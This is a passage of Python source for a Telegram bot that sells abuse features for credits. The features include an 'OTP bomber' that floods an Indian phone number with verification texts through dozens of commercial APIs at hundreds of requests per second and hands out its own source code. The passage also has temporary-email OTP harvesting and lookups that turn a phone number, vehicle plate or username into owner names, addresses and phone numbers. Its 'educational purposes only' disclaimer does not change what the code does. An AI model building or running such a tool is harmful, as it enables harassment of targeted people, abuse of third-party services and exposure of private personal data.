    phone = parts[2]
    
    uid = c.from_user.id
    
    bot.answer_callback_query(c.id, f"🚀 Starting {intensity} bombing...")
    bot.edit_message_text(f"🚀 <b>Starting {intensity} OTP bombing on +91{phone}...</b>\n\nPlease wait...", c.message.chat.id, c.message.message_id, parse_mode='HTML')
    
    # Run bomber in background
    def run_bomber():
        try:
            bomber_file = os.path.join(BOMBER_DIR, "bomber.py")
            
            # Run the bomber script with phone number as argument
            result = subprocess.run(
                [sys.executable, bomber_file],
                input=f"{phone}\ny\n",
                text=True,
                capture_output=True,
                timeout=300  # 5 minutes max
            )
            
            # Send results
            output = result.stdout + result.stderr
            
            if "Total OTPs sent" in output:
                # Extract stats
                lines = output.split('\n')
                stats = {}
                for line in lines:
                    if "Total OTPs sent:" in line:
                        stats['sent'] = line.split(":")[1].strip()
                    elif "Total failed:" in line:
                        stats['failed'] = line.split(":")[1].strip()
                    elif "Total time:" in line:
                        stats['time'] = line.split(":")[1].strip()
                    elif "Average rate:" in line:
                        stats['rate'] = line.split(":")[1].strip()
                
                bot.send_message(
                    c.message.chat.id,
                    f"✅ <b>ULTRA Bombing Completed!</b>\n\n"
                    f"📱 <b>Target:</b> +91{phone}\n"
                    f"⚡ <b>Intensity:</b> {intensity}\n\n"
                    f"📊 <b>Statistics:</b>\n"
                    f"• OTPs Sent: {stats.get('sent', 'N/A')}\n"
                    f"• Failed Requests: {stats.get('failed', 'N/A')}\n"
                    f"• Total Time: {stats.get('time', 'N/A')}\n"
                    f"• Average Rate: {stats.get('rate', 'N/A')}\n\n"
                    f"👑 <b>Developer:</b> {OWNER_USERNAME}",
                    parse_mode='HTML'
                )
            else:
                bot.send_message(
                    c.message.chat.id,
                    f"⚠️ <b>Bombing Completed (Partial)</b>\n\n"
                    f"📱 Target: +91{phone}\n\n"
                    f"<b>Output:</b>\n"
                    f"<code>{output[-1000:]}</code>",
                    parse_mode='HTML'
                )
            
            # Log to group
            uname = f"@{c.from_user.username}" if c.from_user.username else f"ID:{uid}"
            log_to_group(f"💣 ULTRA OTP BOMBER USED\n👤 User: {uname}\n🆔 User ID: {uid}\n📱 Target: +91{phone}\n⚡ Intensity: {intensity}")
            
        except subprocess.TimeoutExpired:
            bot.send_message(
                c.message.chat.id,
                f"⏰ <b>Bombing Timeout!</b>\n\n"
                f"Stopped after 5 minutes.\n"
                f"The target +91{phone} has been bombed extensively.",
                parse_mode='HTML'
            )
        except Exception as e:
            bot.send_message(
                c.message.chat.id,
                f"❌ <b>Error:</b>\n{str(e)}",
                parse_mode='HTML'
            )
    
    threading.Thread(target=run_bomber, daemon=True).start()

@bot.callback_query_handler(func=lambda c: c.data == "bomber_info")
@rate_limit_and_ban_check_cb
def bomber_info(c):
    info_text = (
        "💣 <b>ULTRA-FAST OTP BOMBER (PREMIUM)</b>\n\n"
        "This tool uses 30+ APIs to send OTP requests at ultra-high speed.\n\n"
        "📊 <b>Features:</b>\n"
        "• 30+ API endpoints (Amazon, Flipkart, Swiggy, etc.)\n"
        "• Parallel execution (up to 200 concurrent requests)\n"
        "• Real-time statistics\n"
        "• Auto-retry on failure\n"
        "• Random User-Agent rotation\n\n"
        "⚡ <b>Intensity Levels:</b>\n"
        "• Fast: 50-100 requests/sec\n"
        "• Ultra: 100-200 requests/sec\n"
        "• Nuclear: 200-500 requests/sec\n\n"
        "📈 <b>Performance:</b>\n"
        "• Can send 10,000+ OTPs in 5 minutes\n"
        "• 95%+ success rate\n"
        "• Minimal resource usage\n\n"
        "⚠️ <b>Legal Notice:</b>\n"
        "This tool is for educational purposes only.\n"
        "Unauthorized use against others is illegal.\n"
        "You are responsible for your actions.\n\n"
        "👑 <b>Developer:</b> {OWNER_USERNAME}"
    )
    
    bot.answer_callback_query(c.id)
    bot.send_message(c.message.chat.id, info_text, parse_mode='HTML')

@bot.callback_query_handler(func=lambda c: c.data == "bomber_update")
@rate_limit_and_ban_check_cb
def update_bomber(c):
    bot.answer_callback_query(c.id, "🔄 Updating bomber...")
    
    # Recreate bomber file
    create_ultra_bomber_file()
    
    bot.send_message(
        c.message.chat.id,
        "✅ <b>Bomber Updated!</b>\n\n"
        "The OTP bomber has been updated to version 3.0 with 30+ APIs.",
        parse_mode='HTML'
    )

@bot.callback_query_handler(func=lambda c: c.data == "bomber_view")
@rate_limit_and_ban_check_cb
def view_bomber_file(c):
    bomber_file = os.path.join(BOMBER_DIR, "bomber.py")
    
    if os.path.exists(bomber_file):
        with open(bomber_file, "rb") as f:
            bot.send_document(
                c.message.chat.id,
                f,
                caption="💣 <b>ULTRA OTP Bomber Source Code v3.0</b>",
                parse_mode='HTML'
            )
    else:
        bot.answer_callback_query(c.id, "❌ Bomber file not found!", show_alert=True)

# ==========================================
# 📧 TEMP MAIL SYSTEM (FIXED DELETE FUNCTION)
# ==========================================
@bot.message_handler(func=lambda m: m.text == "📧 Temp Mail")
@rate_limit_and_ban_check
@feature_check("temp_mail")
def temp_mail_menu(m):
    uid = m.from_user.id
    
    # Check channel joins first
    joined, channel = check_all_channels_join(uid)
    if not joined:
        show_channels_to_join(m, uid)
        return
    
    mk = types.InlineKeyboardMarkup(row_width=2)
    mk.add(
        types.InlineKeyboardButton("📧 Create Temp Mail", callback_data="temp_create"),
        types.InlineKeyboardButton("📨 Check Mail", callback_data="temp_check")
    )
    mk.add(
        types.InlineKeyboardButton("🔄 Refresh Inbox", callback_data="temp_refresh"),
        types.InlineKeyboardButton("🗑 Delete Mail", callback_data="temp_delete_menu")
    )
    mk.add(types.InlineKeyboardButton("📋 My Mails", callback_data="temp_list"))
    
    bot.reply_to(
        m,
        "📧 <b>TEMPORARY EMAIL SYSTEM</b>\n\n"
        "Create temporary email addresses and receive emails.\n\n"
        "📌 <b>Features:</b>\n"
        "• Instant email creation\n"
        "• Real-time email checking\n"
        "• Auto OTP detection\n"
        "• Multiple mailboxes\n"
        "• Email forwarding (Premium)\n\n"
        "💡 <b>Perfect for:</b>\n"
        "• Signing up for services\n"
        "• Receiving OTPs\n"
        "• Testing purposes\n"
        "• Privacy protection",
        reply_markup=mk,
        parse_mode='HTML'
    )

def generate_temp_email():
    """Generate random email address"""
    domains = ["1secmail.com", "1secmail.org", "1secmail.net", "wwjmp.com", "esiix.com"]
    username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
    domain = random.choice(domains)
    return f"{username}@{domain}"

@bot.callback_query_handler(func=lambda c: c.data == "temp_create")
@rate_limit_and_ban_check_cb
def create_temp_mail(c):
    uid = c.from_user.id
    
    # Generate email
    email_addr = generate_temp_email()
    username, domain = email_addr.split("@")
    
    # Save to database
    mail_id = f"mail_{uid}_{int(time.time())}"
    temp_mails_db[mail_id] = {
        'user_id': uid,
        'email': email_addr,
        'username': username,
        'domain': domain,
        'created': datetime.now().isoformat(),
        'last_checked': datetime.now().isoformat(),
        'emails': []
    }
    save_database(TEMP_MAIL_DB_FILE, temp_mails_db)
    
    # Store in session for quick access
    temp_mail_sessions[uid] = mail_id
    
    bot.answer_callback_query(c.id, f"📧 Email created: {email_addr}")
    
    mk = types.InlineKeyboardMarkup()
    mk.add(
        types.InlineKeyboardButton("📨 Check Now", callback_data=f"temp_check_{mail_id}"),
        types.InlineKeyboardButton("📋 Copy Email", callback_data=f"temp_copy_{mail_id}")
    )
    
    bot.send_message(
        c.message.chat.id,
        f"✅ <b>Temporary Email Created!</b>\n\n"
        f"📧 <b>Email Address:</b>\n"
        f"<code>{email_addr}</code>\n\n"
        f"🌐 <b>Login URL:</b>\n"
        f"https://www.1secmail.com/?login={username}&domain={domain}\n\n"
        f"📝 <b>How to use:</b>\n"
        "1. Use this email to sign up anywhere\n"
        "2. Click 'Check Now' to see incoming emails\n"
        "3. OTPs will be automatically detected\n\n"
        f"⚠️ <b>Note:</b> Emails auto-delete after 1 hour",
        reply_markup=mk,
        parse_mode='HTML'
    )
    
    # Log creation
    uname = f"@{c.from_user.username}" if c.from_user.username else f"ID:{uid}"
    log_to_group(f"📧 TEMP MAIL CREATED\n👤 User: {uname}\n🆔 User ID: {uid}\n📧 Email: {email_addr}")

@bot.callback_query_handler(func=lambda c: c.data.startswith("temp_check"))
@rate_limit_and_ban_check_cb
def check_temp_mail(c):
    uid = c.from_user.id
    
    if c.data == "temp_check":
        # Check all user mails
        user_mails = [(mid, mail) for mid, mail in temp_mails_db.items() if mail['user_id'] == uid]
        
        if not user_mails:
            bot.answer_callback_query(c.id, "❌ No temp emails found!", show_alert=True)
            return
        
        # Check the most recent mail
        mail_id, mail_data = user_mails[-1]
        check_single_mail(c, mail_id, mail_data)
        
    else:
        # Check specific mail
        mail_id = c.data.split("temp_check_")[1]
        if mail_id in temp_mails_db and temp_mails_db[mail_id]['user_id'] == uid:
            check_single_mail(c, mail_id, temp_mails_db[mail_id])
        else:
            bot.answer_callback_query(c.id, "❌ Mail not found!", show_alert=True)

def check_single_mail(c, mail_id, mail_data):
    """Check emails for a single mailbox"""
    uid = c.from_user.id
    email = mail_data['email']
    username, domain = email.split("@")
    
    bot.answer_callback_query(c.id, "📨 Checking for new emails...")
    
    try:
        # Check emails using 1secmail API
        url = f"https://www.1secmail.com/api/v1/?action=getMessages&login={username}&domain={domain}"
        response = requests.get(url, timeout=10)
        
        if response.status_code == 200:
            messages = response.json()
            
            # Update last checked time
            temp_mails_db[mail_id]['last_checked'] = datetime.now().isoformat()
            save_database(TEMP_MAIL_DB_FILE, temp_mails_db)
            
            if messages:
                # Get all new messages
                new_emails = []
                for msg in messages:
                    msg_id = msg['id']
                    
                    # Check if we already have this email
                    existing = False
                    if 'emails' in temp_mails_db[mail_id]:
                        for existing_msg in temp_mails_db[mail_id]['emails']:
                            if existing_msg.get('id') == msg_id:
                                existing = True
                                break
                    
                    if not existing:
                        # Fetch message details
                        msg_url = f"https://www.1secmail.com/api/v1/?action=readMessage&login={username}&domain={domain}&id={msg_id}"
                        msg_response = requests.get(msg_url, timeout=10)
                        
                        if msg_response.status_code == 200:
                            msg_data = msg_response.json()
                            
                            # Extract OTP if present
                            body = msg_data.get('textBody') or msg_data.get('htmlBody') or ''
                            otp = extract_otp(body)
                            
                            email_data = {
                                'id': msg_id,
                                'from': msg_data.get('from', 'Unknown'),
                                'subject': msg_data.get('subject', 'No Subject'),
                                'date': msg_data.get('date', datetime.now().strftime('%Y-%m-%d %H:%M:%S')),
                                'body': body[:1000],
                                'otp': otp
                            }
                            
                            new_emails.append(email_data)
                
                if new_emails:
                    # Add new emails to database
                    if 'emails' not in temp_mails_db[mail_id]:
                        temp_mails_db[mail_id]['emails'] = []
                    
                    temp_mails_db[mail_id]['emails'].extend(new_emails)
                    
                    # Keep only last 20 emails
                    if len(temp_mails_db[mail_id]['emails']) > 20:
                        temp_mails_db[mail_id]['emails'] = temp_mails_db[mail_id]['emails'][-20:]
                    
                    save_database(TEMP_MAIL_DB_FILE, temp_mails_db)
                    
                    # Show new emails
                    for email_data in new_emails:
                        response_text = f"📨 <b>New Email Received!</b>\n\n"
                        response_text += f"📧 <b>To:</b> {email}\n"
                        response_text += f"📩 <b>From:</b> {email_data['from']}\n"
                        response_text += f"📋 <b>Subject:</b> {email_data['subject']}\n"
                        response_text += f"📅 <b>Date:</b> {email_data['date']}\n\n"
                        
                        if email_data['otp']:
                            response_text += f"🔢 <b>OTP Found:</b> <code>{email_data['otp']}</code>\n\n"
                        
                        response_text += f"<b>Message Preview:</b>\n"
                        body_preview = email_data['body'][:500] + ("..." if len(email_data['body']) > 500 else "")
                        response_text += f"<code>{body_preview}</code>"
                        
                        mk = types.InlineKeyboardMarkup()
                        mk.add(
                            types.InlineKeyboardButton("🔄 Check Again", callback_data=f"temp_check_{mail_id}"),
                            types.InlineKeyboardButton("🗑 Delete This Mailbox", callback_data=f"temp_delete_{mail_id}")
                        )
                        
                        bot.send_message(c.message.chat.id, response_text, reply_markup=mk, parse_mode='HTML')
                
                else:
                    bot.send_message(
                        c.message.chat.id,
                        f"📭 <b>No New Emails</b>\n\n"
                        f"📧 <b>Email:</b> {email}\n"
                        f"🕒 <b>Last checked:</b> {datetime.now().strftime('%H:%M:%S')}\n\n"
                        f"Emails will appear here when received.",
                        parse_mode='HTML'
                    )
            
            else:
                bot.send_message(
                    c.message.chat.id,
                    f"📭 <b>No Emails Yet</b>\n\n"
                    f"📧 <b>Email:</b> {email}\n"
                    f"🕒 <b>Last checked:</b> {datetime.now().strftime('%H:%M:%S')}\n\n"
                    f"Use this email to sign up for services to receive emails.",
                    parse_mode='HTML'
                )
        
        else:
            bot.send_message(c.message.chat.id, "❌ Failed to check emails. API error.", parse_mode='HTML')
    
    except Exception as e:
        bot.send_message(c.message.chat.id, f"❌ Error: {str(e)}", parse_mode='HTML')

def extract_otp(text):
    """Extract OTP from email text"""
    # Look for OTP patterns
    patterns = [
        r'(\b\d{4,6}\b)',  # 4-6 digit OTP
        r'OTP[:\s]*(\d{4,6})',
        r'code[:\s]*(\d{4,6})',
        r'verification[:\s]*(\d{4,6})',
        r'password[:\s]*(\d{4,6})',
        r'One Time Password[:\s]*(\d{4,6})',
        r'(\d{4,6}) is your OTP',
        r'OTP is (\d{4,6})'
    ]
    
    for pattern in patterns:
        match = re.search(pattern, text, re.IGNORECASE)
        if match:
            return match.group(1)
    
    return None

@bot.callback_query_handler(func=lambda c: c.data.startswith("temp_copy_"))
@rate_limit_and_ban_check_cb
def copy_temp_mail(c):
    mail_id = c.data.split("temp_copy_")[1]
    
    if mail_id in temp_mails_db:
        email = temp_mails_db[mail_id]['email']
        bot.answer_callback_query(c.id, f"📋 Copied: {email}")
        
        # Send the email as a message that can be copied
        bot.send_message(
            c.message.chat.id,
            f"📧 <b>Email Address:</b>\n"
            f"<code>{email}</code>\n\n"
            f"Click and hold to copy.",
            parse_mode='HTML'
        )
    else:
        bot.answer_callback_query(c.id, "❌ Mail not found!", show_alert=True)

@bot.callback_query_handler(func=lambda c: c.data == "temp_delete_menu")
@rate_limit_and_ban_check_cb
def temp_delete_menu(c):
    """Show delete menu for temp mails"""
    uid = c.from_user.id
    user_mails = [(mid, mail) for mid, mail in temp_mails_db.items() if mail['user_id'] == uid]
    
    if not user_mails:
        bot.answer_callback_query(c.id, "📭 No temporary emails to delete", show_alert=True)
        return
    
    mk = types.InlineKeyboardMarkup(row_width=1)
    
    for mail_id, mail_data in user_mails:
        email = mail_data['email']
        created = datetime.fromisoformat(mail_data['created']).strftime('%H:%M')
        mk.add(types.InlineKeyboardButton(f"🗑 {email} ({created})", callback_data=f"temp_delete_{mail_id}"))
    
    mk.add(types.InlineKeyboardButton("🗑 Delete All", callback_data="temp_delete_all"))
    mk.add(types.InlineKeyboardButton("❌ Cancel", callback_data="temp_cancel_delete"))
    
    bot.send_message(
        c.message.chat.id,
        "🗑 <b>Select Email to Delete:</b>\n\n"
        "Choose an email address to delete:",
        reply_markup=mk,
        parse_mode='HTML'
    )

@bot.callback_query_handler(func=lambda c: c.data.startswith("temp_delete_"))
@rate_limit_and_ban_check_cb
def delete_temp_mail(c):
    uid = c.from_user.id
    
    if c.data == "temp_delete_all":
        # Delete all user's temp mails
        mails_to_delete = [mid for mid, mail in temp_mails_db.items() if mail['user_id'] == uid]
        
        if not mails_to_delete:
            bot.answer_callback_query(c.id, "📭 No emails to delete", show_alert=True)
            return
        
        deleted_count = 0
        for mail_id in mails_to_delete:
            del temp_mails_db[mail_id]
            deleted_count += 1
        
        save_database(TEMP_MAIL_DB_FILE, temp_mails_db)
        
        # Remove from session if present
        if uid in temp_mail_sessions:
            del temp_mail_sessions[uid]
        
        bot.answer_callback_query(c.id, f"🗑 Deleted {deleted_count} emails!")
        bot.send_message(
            c.message.chat.id,
            f"🗑 <b>All Temporary Emails Deleted</b>\n\n"
            f"✅ <b>Status:</b> Successfully deleted {deleted_count} email(s)\n\n"
            f"All emails and their data have been permanently removed.",
            parse_mode='HTML'
        )
        
        # Log deletion
        uname = f"@{c.from_user.username}" if c.from_user.username else f"ID:{uid}"
        log_to_group(f"🗑 ALL TEMP MAILS DELETED\n👤 User: {uname}\n🆔 User ID: {uid}\n📧 Count: {deleted_count}")
        
        return
    
    mail_id = c.data.split("temp_delete_")[1]
    
    if mail_id in temp_mails_db and temp_mails_db[mail_id]['user_id'] == uid:
        email = temp_mails_db[mail_id]['email']
        del temp_mails_db[mail_id]
        save_database(TEMP_MAIL_DB_FILE, temp_mails_db)
        
        # Remove from session if present
        if uid in temp_mail_sessions and temp_mail_sessions[uid] == mail_id:
            del temp_mail_sessions[uid]
        
        bot.answer_callback_query(c.id, f"🗑 Deleted: {email}")
        
        # Delete the message with buttons
        bot.delete_message(c.message.chat.id, c.message.message_id)
        
        bot.send_message(
            c.message.chat.id,
            f"🗑 <b>Temporary Email Deleted</b>\n\n"
            f"📧 <b>Email:</b> {email}\n"
            f"✅ <b>Status:</b> Successfully deleted\n\n"
            f"All emails associated with this address are gone.",
            parse_mode='HTML'
        )
        
        # Log deletion
        uname = f"@{c.from_user.username}" if c.from_user.username else f"ID:{uid}"
        log_to_group(f"🗑 TEMP MAIL DELETED\n👤 User: {uname}\n🆔 User ID: {uid}\n📧 Email: {email}")
    else:
        bot.answer_callback_query(c.id, "❌ Mail not found!", show_alert=True)

@bot.callback_query_handler(func=lambda c: c.data == "temp_cancel_delete")
@rate_limit_and_ban_check_cb
def temp_cancel_delete(c):
    bot.answer_callback_query(c.id, "❌ Deletion cancelled")
    bot.delete_message(c.message.chat.id, c.message.message_id)

@bot.callback_query_handler(func=lambda c: c.data == "temp_refresh")
@rate_limit_and_ban_check_cb
def refresh_temp_inbox(c):
    uid = c.from_user.id
    
    # Get user's most recent mail
    user_mails = [(mid, mail) for mid, mail in temp_mails_db.items() if mail['user_id'] == uid]
    
    if not user_mails:
        bot.answer_callback_query(c.id, "❌ No temp emails found!", show_alert=True)
        return
    
    bot.answer_callback_query(c.id, "🔄 Refreshing all inboxes...")
    
    # Check all user mails
    for mail_id, mail_data in user_mails:
        check_single_mail(c, mail_id, mail_data)
        time.sleep(1)  # Delay between checks

@bot.callback_query_handler(func=lambda c: c.data == "temp_list")
@rate_limit_and_ban_check_cb
def list_temp_mails(c):
    uid = c.from_user.id
    
    user_mails = [(mid, mail) for mid, mail in temp_mails_db.items() if mail['user_id'] == uid]
    
    if not user_mails:
        bot.answer_callback_query(c.id, "📭 No temporary emails", show_alert=True)
        return
    
    response = "📧 <b>Your Temporary Emails:</b>\n\n"
    
    for i, (mail_id, mail_data) in enumerate(user_mails, 1):
        email = mail_data['email']
        created = datetime.fromisoformat(mail_data['created']).strftime('%H:%M')
        email_count = len(mail_data.get('emails', []))
        
        response += f"{i}. <code>{email}</code>\n"
        response += f"   📅 Created: {created} | 📨 Emails: {email_count}\n\n"
    
    response += f"Total: {len(user_mails)} email(s)"
    
    mk = types.InlineKeyboardMarkup()
    for mail_id, mail_data in user_mails[-3:]:  # Show last 3
        email = mail_data['email']
        mk.add(types.InlineKeyboardButton(f"📧 {email[:15]}...", callback_data=f"temp_check_{mail_id}"))
    
    mk.add(types.InlineKeyboardButton("➕ Create New", callback_data="temp_create"))
    
    bot.send_message(c.message.chat.id, response, reply_markup=mk, parse_mode='HTML')

# ==========================================
# 📞 NUMBER LOOKUP - FIXED WITH NEW API
# ==========================================
@bot.message_handler(commands=['num'])
@rate_limit_and_ban_check
@feature_check("number_lookup")
def num_lookup(m):
    uid = m.from_user.id
    
    # Check channel joins first
    joined, channel = check_all_channels_join(uid)
    if not joined:
        show_channels_to_join(m, uid)
        return
    
    # Get input
    try:
        num = m.text.split()[1]
        if not num.isdigit():
            raise ValueError
    except:
        bot.reply_to(m, "📌 <b>Usage:</b> /num 9876543210", parse_mode='HTML')
        return
    
    # Check credits
    user_info = users_db.get(str(uid), {})
    if user_info.get('credits', 0) < 1:
        bot.reply_to(
            m,
            f"❌ <b>Insufficient Credits!</b>\n\n"
            f"You have {user_info.get('credits', 0)} credits.\n"
            f"Get more credits by:\n"
            f"• Waiting for daily bonus (5 credits/day)\n"
            f"• Referring friends (2 credits each)\n"
            f"• Buying premium packages",
            parse_mode='HTML'
        )
        return
    
    bot.send_chat_action(m.chat.id, "typing")
    
    # Call API from database
    api_url = apis_db.get("NUMBER_API", APIS["NUMBER_API"])
    
    try:
        response = requests.get(f"{api_url}{num}", timeout=10)
        
        if response.status_code == 200:
            data = response.json()
            
            # Deduct credit
            if str(uid) in users_db:
                users_db[str(uid)]['credits'] = max(0, users_db[str(uid)].get('credits', 0) - 1)
                save_database(USERS_DB_FILE, users_db)
            
            # Format output based on API response structure
            formatted_text = "✅ <b>Number Information Found</b>\n\n"
            formatted_text += f"📱 <b>Phone Number:</b> +91{num}\n"
            formatted_text += f"📅 <b>Lookup Date:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
            
            if isinstance(data, dict):
                for key, value in data.items():
                    if value and str(value).strip():
                        formatted_text += f"<b>{key.replace('_', ' ').title()}:</b> {value}\n"
            elif isinstance(data, list):
                for item in data[:10]:  # Show first 10 items
                    if isinstance(item, dict):
                        for k, v in item.items():
                            if v and str(v).strip():
                                formatted_text += f"<b>{k}:</b> {v}\n"
                        formatted_text += "─\n"
            
            formatted_text += f"\n🤖 <b>Bot:</b> {BOT_USERNAME}\n"
            formatted_text += f"👑 <b>Developer:</b> {OWNER_USERNAME}"
            
            bot.reply_to(m, formatted_text, parse_mode='HTML')
            
            # Log lookup
            uname = f"@{m.from_user.username}" if m.from_user.username else f"ID:{uid}"
            log_to_group(f"📞 NUMBER LOOKUP\n👤 User: {uname}\n🆔 User ID: {uid}\n📱 Number: {num}")
        
        else:
            bot.reply_to(m, f"❌ API Error: Status {response.status_code}", parse_mode='HTML')
    
    except Exception as e:
        bot.reply_to(m, f"❌ Error: {str(e)}\nCredit was not deducted.", parse_mode='HTML')

@bot.message_handler(func=lambda m: m.text == "📞 Number Lookup")
@rate_limit_and_ban_check
def num_lookup_button(m):
    bot.reply_to(
        m,
        "📞 <b>Number Lookup</b>\n\n"
        "<b>Usage:</b> /num 9876543210\n\n"
        "<b>Example:</b> /num 9876543210\n\n"
        "💡 <b>Note:</b> Requires 1 credit per lookup\n\n"
        "🔍 <b>Information Provided:</b>\n"
        "• Carrier information\n"
        "• Location details\n"
        "• Number type\n"
        "• Other available data",
        parse_mode='HTML'
    )

# ==========================================
# 🚗 VEHICLE LOOKUP - NEW FEATURE
# ==========================================
@bot.message_handler(commands=['vehicle', 'car'])
@rate_limit_and_ban_check
@feature_check("vehicle_lookup")
def vehicle_lookup(m):
    uid = m.from_user.id
    
    # Check channel joins first
    joined, channel = check_all_channels_join(uid)
    if not joined:
        show_channels_to_join(m, uid)
        return
    
    # Get input
    try:
        vehicle_num = m.text.split()[1].upper()
        if len(vehicle_num) < 5:
            raise ValueError
    except:
        bot.reply_to(m, "📌 <b>Usage:</b> /vehicle KA01AB1234\n\nExample: /vehicle KA01AB1234", parse_mode='HTML')
        return
    
    # Check credits
    user_info = users_db.get(str(uid), {})
    if user_info.get('credits', 0) < 2:
        bot.reply_to(
            m,
            f"❌ <b>Insufficient Credits!</b>\n\n"
            f"You have {user_info.get('credits', 0)} credits.\n"
            f"Vehicle lookup requires 2 credits.\n\n"
            f"Get more credits by:\n"
            f"• Waiting for daily bonus (5 credits/day)\n"
            f"• Referring friends (2 credits each)\n"
            f"• Buying premium packages",
            parse_mode='HTML'
        )
        return
    
    bot.send_chat_action(m.chat.id, "typing")
    
    # Call Vehicle API from database
    api_url = apis_db.get("VEHICLE_API", APIS["VEHICLE_API"])
    
    try:
        encoded_number = urllib.parse.quote(vehicle_num)
        response = requests.get(f"{api_url}{encoded_number}", timeout=15)
        
        if response.status_code == 200:
            data = response.json()
            
            # Deduct credit
            if str(uid) in users_db:
                users_db[str(uid)]['credits'] = max(0, users_db[str(uid)].get('credits', 0) - 2)
                save_database(USERS_DB_FILE, users_db)
            
            # Format response
            formatted_text = "🚗 <b>Vehicle Information Found</b>\n\n"
            formatted_text += f"🔢 <b>Vehicle Number:</b> {vehicle_num}\n"
            formatted_text += f"📅 <b>Lookup Date:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
            
            if isinstance(data, dict):
                # Format common vehicle information
                fields = {
                    'owner_name': '👤 Owner Name',
                    'father_name': '👨 Father Name',
                    'address': '📍 Address',
                    'registration_date': '📅 Registration Date',
                    'vehicle_class': '🚗 Vehicle Class',
                    'fuel_type': '⛽ Fuel Type',
                    'engine_no': '⚙️ Engine Number',
                    'chassis_no': '🔩 Chassis Number',
                    'maker_model': '🏭 Maker Model',
                    'fitness_upto': '✅ Fitness Valid Until',
                    'insurance_upto': '🛡️ Insurance Valid Until',
                    'tax_upto': '💰 Tax Paid Until'
                }
                
                for key, display_name in fields.items():
                    if key in data and data[key]:
                        formatted_text += f"<b>{display_name}:</b> {data[key]}\n"
                
                # Add status if available
                if 'status' in data:
                    formatted_text += f"\n<b>📊 Status:</b> {data['status']}\n"
            
            else:
                # Raw JSON response
                formatted_text += "<b>Raw Response:</b>\n"
                formatted_text += f"<code>{json.dumps(data, indent=2, ensure_ascii=False)[:1500]}</code>"
            
            formatted_text += f"\n\n🤖 <b>Bot:</b> {BOT_USERNAME}\n"
            formatted_text += f"👑 <b>Developer:</b> {OWNER_USERNAME}"
            
            bot.reply_to(m, formatted_text, parse_mode='HTML')
            
            # Log lookup
            uname = f"@{m.from_user.username}" if m.from_user.username else f"ID:{uid}"
            log_to_group(f"🚗 VEHICLE LOOKUP\n👤 User: {uname}\n🆔 User ID: {uid}\n🚗 Vehicle: {vehicle_num}")
        
        else:
            bot.reply_to(m, f"❌ API Error: Status {response.status_code}", parse_mode='HTML')
    
    except Exception as e:
        bot.reply_to(m, f"❌ Error: {str(e)}\nCredits were not deducted.", parse_mode='HTML')

@bot.message_handler(func=lambda m: m.text == "🚗 Vehicle Lookup")
@rate_limit_and_ban_check
def vehicle_lookup_button(m):
    bot.reply_to(
        m,
        "🚗 <b>Vehicle Information Lookup</b>\n\n"
        "<b>Usage:</b> /vehicle KA01AB1234\n\n"
        "<b>Examples:</b>\n"
        "/vehicle KA01AB1234\n"
        "/vehicle DL4CAF1234\n"
        "/vehicle MH12DE4567\n\n"
        "💡 <b>Note:</b> Requires 2 credits per lookup\n\n"
        "🔍 <b>Information Provided:</b>\n"
        "• Owner name and address\n"
        "• Registration details\n"
        "• Vehicle specifications\n"
        "• Insurance & fitness status\n"
        "• Tax payment information",
        parse_mode='HTML'
    )

# ==========================================
# 🕵️ SHERLOCK LOOKUP - NEW FEATURE
# ==========================================
@bot.message_handler(commands=['sherlock', 'phonefinder'])
@rate_limit_and_ban_check
@feature_check("sherlock_lookup")
def sherlock_lookup(m):
    uid = m.from_user.id
    
    # Check channel joins first
    joined, channel = check_all_channels_join(uid)
    if not joined:
        show_channels_to_join(m, uid)
        return
    
    # Get input
    try:
        username = m.text.split()[1]
        if not username.strip():
            raise ValueError
    except:
        bot.reply_to(m, "📌 <b>Usage:</b> /sherlock username\n\nExample: /sherlock john_doe", parse_mode='HTML')
        return
    
    # Check credits
    user_info = users_db.get(str(uid), {})
    if user_info.get('credits', 0) < 1:
        bot.reply_to(
            m,
            f"❌ <b>Insufficient Credits!</b>\n\n"
            f"You have {user_info.get('credits', 0)} credits.\n"
            f"Sherlock lookup requires 1 credit.\n\n"
            f"Get more credits by:\n"
            f"• Waiting for daily bonus (5 credits/day)\n"
            f"• Referring friends (2 credits each)\n"
            f"• Buying premium packages",
            parse_mode='HTML'
        )
        return
    
    bot.send_chat_action(m.chat.id, "typing")
    
    # Call Sherlock API from database
    api_url = apis_db.get("SHERLOCK_API", APIS["SHERLOCK_API"])
    
    try:
        encoded_username = urllib.parse.quote(username)
        response = requests.get(f"{api_url}{encoded_username}", timeout=15)
        
        if response.status_code == 200:
            data = response.json()
            
            # Deduct credit
            if str(uid) in users_db:
                users_db[str(uid)]['credits'] = max(0, users_db[str(uid)].get('credits', 0) - 1)
                save_database(USERS_DB_FILE, users_db)
            
            # Format response
            formatted_text = "🕵️ <b>Sherlock Phone Finder</b>\n\n"
            formatted_text += f"👤 <b>Username:</b> @{username}\n"
            formatted_text += f"📅 <b>Lookup Date:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
            
            if isinstance(data, dict):
                if 'phone' in data and data['phone']:
                    formatted_text += f"✅ <b>Phone Number Found!</b>\n\n"
                    formatted_text += f"📱 <b>Phone Number:</b> {data['phone']}\n"
                    
                    if 'carrier' in data and data['carrier']:
                        formatted_text += f"📞 <b>Carrier:</b> {data['carrier']}\n"
                    
                    if 'location' in data and data['location']:
                        formatted_text += f"📍 <b>Location:</b> {data['location']}\n"
                    
                    if 'registered' in data and data['registered']:
                        formatted_text += f"📅 <b>Registered:</b> {data['registered']}\n"
                
                elif 'error' in data:
                    formatted_text += f"❌ <b>Error:</b> {data['error']}\n"
                else:
                    formatted_text += "❌ <b>No phone number found for this username.</b>\n"
            
            elif isinstance(data, list):
                formatted_text += "<b>Multiple Results Found:</b>\n\n"
                for i, item in enumerate(data[:5], 1):  # Show first 5 results
                    if isinstance(item, dict) and 'phone' in item:
                        formatted_text += f"{i}. 📱 {item.get('phone', 'N/A')}\n"
                        if 'platform' in item:
                            formatted_text += f"   🌐 Platform: {item['platform']}\n"
                        formatted_text += "\n"
            
            formatted_text += f"\n🤖 <b>Bot:</b> {BOT_USERNAME}\n"
            formatted_text += f"👑 <b>Developer:</b> {OWNER_USERNAME}"
            
            bot.reply_to(m, formatted_text, parse_mode='HTML')
            
            # Log lookup
            uname = f"@{m.from_user.username}" if m.from_user.username else f"ID:{uid}"
            log_to_group(f"🕵️ SHERLOCK LOOKUP\n👤 User: {uname}\n🆔 User ID: {uid}\n👤 Target: {username}")
        
        else:
